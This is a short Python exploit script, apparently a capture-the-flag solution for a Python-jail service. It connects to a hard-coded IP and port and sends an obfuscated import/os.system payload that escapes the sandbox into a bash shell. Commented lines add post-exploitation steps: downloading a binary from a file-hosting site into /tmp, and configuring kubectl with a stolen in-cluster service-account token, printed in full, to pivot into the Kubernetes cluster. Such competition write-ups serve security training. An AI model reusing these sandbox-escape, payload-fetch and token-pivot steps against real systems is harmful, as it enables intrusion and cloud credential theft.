from pwn import *

host = '34.93.14.197'
port = 31337

cmd = b"__builtins__.__dict__['__imp''ort__']('o''s').__dict__['sys''tem']('bash')"

p = remote(host, port)
p.recvuntil(b'>>> ')
p.sendlineafter(b'>>> ', cmd)

p.interactive()
p.close()

# python3 -c "from urllib import request; request.urlretrieve('http://0x0.st/oibl.so', '/tmp/curl')"
# ./kubectl config set-cluster Kube --server=https://container.googleapis.com/v1/projects/inctf-329912/locations/asia-south1-b/clusters/inctf-cluster --certificate-authority=ca.crt


# ./kubectl config set-cluster Kube --server=https://10.96.0.1:443 --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
# ./kubectl config set-context Kube --cluster=Kube
# ./kubectl config set-credentials user --token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImtST0xPWkNtXzJWdUJwUHlVUjlBV3Q4RjhpUGtUczc1MWMyVkN0V1dmYncifQ.eyJhdWQiOlsiaHR0cHM6Ly9jb250YWluZXIuZ29vZ2xlYXBpcy5jb20vdjEvcHJvamVjdHMvaW5jdGYtMzI5OTEyL2xvY2F0aW9ucy9hc2lhLXNvdXRoMS1iL2NsdXN0ZXJzL2luY3RmLWNsdXN0ZXIiXSwiZXhwIjoxNjczMTUyNzI4LCJpYXQiOjE2NDE2MTY3MjgsImlzcyI6Imh0dHBzOi8vY29udGFpbmVyLmdvb2dsZWFwaXMuY29tL3YxL3Byb2plY3RzL2luY3RmLTMyOTkxMi9sb2NhdGlvbnMvYXNpYS1zb3V0aDEtYi9jbHVzdGVycy9pbmN0Zi1jbHVzdGVyIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJpbmN0Zi1weXRob24tamFpbC01NmI0Zjg4NTc3LWI5NWRrIiwidWlkIjoiMjE2NmYxMTAtOGM5Zi00YzA3LWI2NGUtYzhjMWNlYmRkZGJmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJpbmN0Zi1jaGFsbC1zYSIsInVpZCI6IjVkM2ZhNGJhLTg4MzItNDAyZS1iYzE4LWM2ODg0OWRmNzUyMyJ9LCJ3YXJuYWZ0ZXIiOjE2NDE2MjAzMzV9LCJuYmYiOjE2NDE2MTY3MjgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmluY3RmLWNoYWxsLXNhIn0.gXd2lTp0vE-2I51mwyuzJ0iAoXkjpY5Sznd2wHG7vGBN8g8qCHrF5B0CXNp6LePMKDC1fwGAi_aICff-LBI59NAti84MoDwdL0cirgU9Wp3ged2yqNaaXUGER310gNLJ2Z8JN9idk59uJCKw7wv5TtzrHTW2hgGdkEo8BhkrCy735mLgwYE2Vjjv08Ht9evsIAvX76FKY0xAu1PjKMbGnaQdMyoXU4xrhx7U1GFE-hc13jBHyig1dJKyqevezqnQ1KxuFixJicIDI2MnxEcmkG9KPHBbAhBBYjF4rCUAc5hn37kVfprEhVraJjguvbJ0sJcpUO89-q-udVBJj0OEpw
# ./kubectl config set-context Kube --user=default
# ./kubectl config use-context Kube